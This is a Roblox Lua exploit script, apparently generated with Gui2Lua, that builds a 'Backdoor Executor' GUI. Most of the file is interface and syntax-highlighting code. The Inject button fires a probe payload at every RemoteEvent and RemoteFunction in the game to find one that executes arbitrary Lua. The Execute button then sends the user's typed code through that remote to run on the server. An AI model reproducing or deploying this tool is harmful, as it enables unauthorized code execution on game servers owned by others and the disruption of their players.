--[[

		Gui2Lua™
		10zOfficial
		Version 1.0.0

]]


-- Instances

local epicals = Instance.new("ScreenGui")
local open = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local ImageButton = Instance.new("ImageButton")
local main = Instance.new("Frame")
local Frame_3 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local ScrollingFrame = Instance.new("ScrollingFrame")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local exe = Instance.new("TextButton")
local cls = Instance.new("TextButton")
local inj = Instance.new("TextButton")
local TextBox = Instance.new("TextBox")
local TextLabel_2 = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local Icon = Instance.new("ImageLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

-- Properties

epicals.Name = "epicals"
epicals.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
epicals.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

open.Name = "open"
open.Parent = epicals
open.BackgroundColor3 = Color3.new(1, 1, 1)
open.BackgroundTransparency = 1
open.BorderColor3 = Color3.new(0, 0, 0)
open.BorderSizePixel = 0
open.Position = UDim2.new(0.0163043477, 0, 0.817839205, 0)
open.Size = UDim2.new(0.12655279, 0, 0.154522613, 0)

ImageLabel.Parent = open
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = Color3.new(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.0112105757, 0, -0.00697537558, 0)
ImageLabel.Size = UDim2.new(0, 122, 0, 121)
ImageLabel.ZIndex = 0
ImageLabel.Image = "rbxassetid://17871076086"

Frame.Parent = open
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(0, 122, 0, 121)
Frame.ZIndex = 0

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.new(1, 0.882353, 0)
Frame_2.BorderColor3 = Color3.new(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.762295067, 0, 0, 0)
Frame_2.Size = UDim2.new(0, 28, 0, 29)

UICorner.Parent = Frame_2
UICorner.CornerRadius = UDim.new(0, 999)

ImageButton.Parent = open
ImageButton.BackgroundColor3 = Color3.new(1, 1, 1)
ImageButton.BackgroundTransparency = 1
ImageButton.BorderColor3 = Color3.new(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.079136692, 0, 0.0704225376, 0)
ImageButton.Size = UDim2.new(0, 100, 0, 100)
ImageButton.ZIndex = 0
ImageButton.Image = "rbxassetid://78976970"

main.Name = "main"
main.Parent = epicals
main.BackgroundColor3 = Color3.new(1, 1, 1)
main.BorderColor3 = Color3.new(0, 0, 0)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.449534148, 0, 0.165829152, 0)
main.Size = UDim2.new(0, 455, 0, 43)
main.Visible = false

Frame_3.Parent = main
Frame_3.BackgroundColor3 = Color3.new(0.184314, 0.184314, 0.184314)
Frame_3.BorderColor3 = Color3.new(0, 0, 0)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0, 0, 0.808971345, 0)
Frame_3.Size = UDim2.new(0, 455, 0, 253)

UICorner_2.Parent = Frame_3

ScrollingFrame.Parent = Frame_3
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(0, 455, 0, 253)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 7, 0)

Main.Name = "Main"
Main.Parent = ScrollingFrame
Main.BackgroundColor3 = Color3.new(1, 1, 1)
Main.BackgroundTransparency = 1
Main.BorderColor3 = Color3.new(0, 0, 0)
Main.BorderSizePixel = 0
Main.Size = UDim2.new(1, 0, 1, 0)

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0.0169395823, 0)
TextLabel.Size = UDim2.new(0, 455, 0, -20)
TextLabel.Font = Enum.Font.Arial
TextLabel.Text = "Backdoor Executor"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 21

exe.Name = "exe"
exe.Parent = Main
exe.BackgroundColor3 = Color3.new(0, 0, 0)
exe.BorderColor3 = Color3.new(1, 1, 1)
exe.Position = UDim2.new(0.0285714287, 0, 0.20271033, 0)
exe.Size = UDim2.new(0, 99, 0, 23)
exe.Font = Enum.Font.Arial
exe.Text = "Execute"
exe.TextColor3 = Color3.new(1, 1, 1)
exe.TextSize = 22

cls.Name = "cls"
cls.Parent = Main
cls.BackgroundColor3 = Color3.new(0, 0, 0)
cls.BorderColor3 = Color3.new(1, 1, 1)
cls.Position = UDim2.new(0.263736278, 0, 0.20271033, 0)
cls.Size = UDim2.new(0, 99, 0, 23)
cls.Font = Enum.Font.Arial
cls.Text = "Clear"
cls.TextColor3 = Color3.new(1, 1, 1)
cls.TextSize = 22

inj.Name = "inj"
inj.Parent = Main
inj.BackgroundColor3 = Color3.new(0, 0, 0)
inj.BorderColor3 = Color3.new(1, 1, 1)
inj.Position = UDim2.new(0.74505496, 0, 0.20271033, 0)
inj.Size = UDim2.new(0, 99, 0, 23)
inj.Font = Enum.Font.Arial
inj.Text = "Inject"
inj.TextColor3 = Color3.new(1, 1, 1)
inj.TextSize = 22

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
TextBox.BorderColor3 = Color3.new(1, 1, 1)
TextBox.Position = UDim2.new(0.0285714287, 0, 0.0214568041, 0)
TextBox.Size = UDim2.new(0, 425, 0, 310)
TextBox.Font = Enum.Font.RobotoMono
TextBox.PlaceholderText = "-- write ur code here lol"
TextBox.Text = ""
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.TextSize = 17
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

TextLabel_2.Parent = TextBox
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
TextLabel_2.Font = Enum.Font.RobotoMono
TextLabel_2.Text = ""
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextSize = 17
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_2.TextYAlignment = Enum.TextYAlignment.Top

UICorner_3.Parent = main

Icon.Name = "Icon"
Icon.Parent = main
Icon.BackgroundColor3 = Color3.new(1, 1, 1)
Icon.BackgroundTransparency = 1
Icon.BorderColor3 = Color3.new(0, 0, 0)
Icon.BorderSizePixel = 0
Icon.Position = UDim2.new(0.0285714287, 0, 0.0961076617, 0)
Icon.Size = UDim2.new(0, 24, 0, 24)
Icon.Image = "rbxassetid://78976970"

TextLabel_3.Parent = Icon
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(1.27272797, 0, -0.157894775, 0)
TextLabel_3.Size = UDim2.new(0, 165, 0, 27)
TextLabel_3.Font = Enum.Font.SourceSansSemibold
TextLabel_3.Text = "Epicals"
TextLabel_3.TextColor3 = Color3.new(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 35
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = main
TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.854945064, 0, 0.116279244, 0)
TextButton.Size = UDim2.new(0, 58, 0, 20)
TextButton.Font = Enum.Font.Unknown
TextButton.Text = "X"
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.TextSize = 17
TextButton.TextWrapped = true

-- Module Scripts

local fake_module_scripts = {}

do -- nil.ModuleScript
	local script = Instance.new('ModuleScript', nil)
	local function module_script()
		local highlighter = {}
		local keywords = {
			lua = {
				"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
				"local", "return", "function", "export"
			},
			rbx = {
				"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
				"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
				"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
				"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
				"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
			},
			operators = {
				"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":"
			}
		}
		
		local colors = {
			numbers = Color3.fromRGB(255, 198, 0),
			boolean = Color3.fromRGB(214, 128, 23),
			operator = Color3.fromRGB(232, 210, 40),
			lua = Color3.fromRGB(160, 87, 248),
			rbx = Color3.fromRGB(146, 180, 253),
			str = Color3.fromRGB(56, 241, 87),
			comment = Color3.fromRGB(103, 110, 149),
			null = Color3.fromRGB(79, 79, 79),
			call = Color3.fromRGB(130, 170, 255),
			self_call = Color3.fromRGB(227, 201, 141),
			local_color = Color3.fromRGB(199, 146, 234),
			function_color = Color3.fromRGB(241, 122, 124),
			self_color = Color3.fromRGB(146, 134, 234),
			local_property = Color3.fromRGB(129, 222, 255),
		}
		
		local function createKeywordSet(keywords)
			local keywordSet = {}
			for _, keyword in ipairs(keywords) do
				keywordSet[keyword] = true
			end
			return keywordSet
		end
		
		local luaSet = createKeywordSet(keywords.lua)
		local rbxSet = createKeywordSet(keywords.rbx)
		local operatorsSet = createKeywordSet(keywords.operators)
		
		local function getHighlight(tokens, index)
			local token = tokens[index]
		
			if colors[token .. "_color"] then
				return colors[token .. "_color"]
			end
		
			if tonumber(token) then
				return colors.numbers
			elseif token == "nil" then
				return colors.null
			elseif token:sub(1, 2) == "--" then
				return colors.comment
			elseif operatorsSet[token] then
				return colors.operator
			elseif luaSet[token] then
				return colors.rbx
			elseif rbxSet[token] then
				return colors.lua
			elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
				return colors.str
			elseif token == "true" or token == "false" then
				return colors.boolean
			end
		
			if tokens[index + 1] == "(" then
				if tokens[index - 1] == ":" then
					return colors.self_call
				end
		
				return colors.call
			end
		
			if tokens[index - 1] == "." then
				if tokens[index - 2] == "Enum" then
					return colors.rbx
				end
		
				return colors.local_property
			end
		end
		
		function highlighter.run(source)
			local tokens = {}
			local currentToken = ""
		
			local inString = false
			local inComment = false
			local commentPersist = false
		
			for i = 1, #source do
				local character = source:sub(i, i)
		
				if inComment then
					if character == "\n" and not commentPersist then
						table.insert(tokens, currentToken)
						table.insert(tokens, character)
						currentToken = ""
		
						inComment = false
					elseif source:sub(i - 1, i) == "]]" and commentPersist then
						currentToken ..= "]"
		
						table.insert(tokens, currentToken)
						currentToken = ""
		
						inComment = false
						commentPersist = false
					else
						currentToken = currentToken .. character
					end
				elseif inString then
					if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
						currentToken = currentToken .. character
						inString = false
					else
						currentToken = currentToken .. character
					end
				else
					if source:sub(i, i + 1) == "--" then
						table.insert(tokens, currentToken)
						currentToken = "-"
						inComment = true
						commentPersist = source:sub(i + 2, i + 3) == "[["
					elseif character == "\"" or character == "\'" then
						table.insert(tokens, currentToken)
						currentToken = character
						inString = character
					elseif operatorsSet[character] then
						table.insert(tokens, currentToken)
						table.insert(tokens, character)
						currentToken = ""
					elseif character:match("[%w_]") then
						currentToken = currentToken .. character
					else
						table.insert(tokens, currentToken)
						table.insert(tokens, character)
						currentToken = ""
					end
				end
			end
		
			table.insert(tokens, currentToken)
		
			local highlighted = {}
		
			for i, token in ipairs(tokens) do
				local highlight = getHighlight(tokens, i)
		
				if highlight then
					local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))
		
					table.insert(highlighted, syntax)
				else
					table.insert(highlighted, token)
				end
			end
		
			return table.concat(highlighted)
		end
		
		return highlighter
	end
	fake_module_scripts[script] = module_script
end


-- Scripts

local function PBMSKX_fake_script() -- ImageLabel.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	while wait() do
		script.Parent.Rotation += 1
	end
end
coroutine.wrap(PBMSKX_fake_script)()
local function XHGIWE_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	while wait() do
		script.Parent.Rotation += 1
	end
end
coroutine.wrap(XHGIWE_fake_script)()
local function IUWL_fake_script() -- open.UIDrag 
	local script = Instance.new('LocalScript', open)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(IUWL_fake_script)()
local function VMHJ_fake_script() -- ImageButton.LocalScript 
	local script = Instance.new('LocalScript', ImageButton)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.main.Visible = true
	end)
end
coroutine.wrap(VMHJ_fake_script)()
local function JLHE_fake_script() -- exe.LocalScript 
	local script = Instance.new('LocalScript', exe)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local bckdoor
	
	script.Parent.Parent.cls.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = ''
	end)
	
	script.Parent.Parent.inj.MouseButton1Click:Connect(function()
		for _, v in pairs(game:GetDescendants()) do
			if v:IsA('RemoteEvent') or v:IsA('RemoteFunction') then
				if v:IsA('RemoteEvent') then
					v:FireServer('local a = Instance.new("Script"); a.Name = "BackdoorScriptTestAssurance";')
					if workspace:FindFirstChild("BackdoorScriptTestAssurance") then
						bckdoor = v
						workspace.BackdoorScriptTestAssurance:Destroy()
						break
					end
				elseif v:IsA('RemoteFunction') then
					v:InvokeServer('local a = Instance.new("Script"); a.Name = "BackdoorScriptTestAssurance";')
					if workspace:FindFirstChild("BackdoorScriptTestAssurance") then
						bckdoor = v
						workspace.BackdoorScriptTestAssurance:Destroy()
						break
					end
				end
			end
		end
	end)
	
	script.Parent.MouseButton1Click:Connect(function()
		if bckdoor ~= nil then
			if bckdoor:IsA('RemoteEvent') then
				bckdoor:FireServer(script.Parent.Parent.TextBox.Text)
			elseif bckdoor:IsA('RemoteFunction') then
				bckdoor:InvokeServer(script.Parent.Parent.TextBox.Text)
			end
		else
			script.Parent.Text = 'No backdoor'
			wait(1)
			script.Parent.Text = 'Execute'
		end
	end)
end
coroutine.wrap(JLHE_fake_script)()
local function OWMBTVP_fake_script() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript', TextBox)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent:GetPropertyChangedSignal('Text'):Connect(function()
		script.Parent.TextLabel.Text = require(script.Parent.LocalScript.ModuleScript).run(script.Parent.Text)
	end)
end
coroutine.wrap(OWMBTVP_fake_script)()
local function QSYVCPU_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.open.Visible = true
	end)
end
coroutine.wrap(QSYVCPU_fake_script)()
